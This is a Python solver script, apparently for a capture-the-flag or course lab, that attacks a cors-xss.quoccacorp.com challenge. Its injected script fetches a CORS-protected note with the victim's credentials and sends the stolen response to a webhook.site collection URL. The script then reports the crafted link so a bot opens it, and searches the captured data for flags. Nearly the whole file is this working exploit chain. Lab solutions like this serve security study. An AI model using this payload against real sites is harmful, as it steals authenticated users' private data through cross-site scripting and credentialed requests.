import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://cors-xss.quoccacorp.com"
        CORS_API_CALLER_URL = "https://cors-api-caller.quoccacorp.com"

        # response = self.session.get(CORS_API_CALLER_URL)
        # soup = BeautifulSoup(response.text, "html.parser")
        # script_element = soup.find("script")
        # print(script_element)

        PAYLOAD = f'''<script>
const API = "https://cors-api.quoccacorp.com";
const MY_ORIGIN = "{BASE_URL}";

fetch(`${{API}}/note?cors-allow-origin=${{encodeURIComponent(MY_ORIGIN)}}`, {{credentials: "include"}})
.then(response => response.text())
.then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`));
</script>'''

        response = self.session.get(BASE_URL, params={"name": PAYLOAD})
        self.session.post(f"{BASE_URL}/report", data={"url": response.url})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
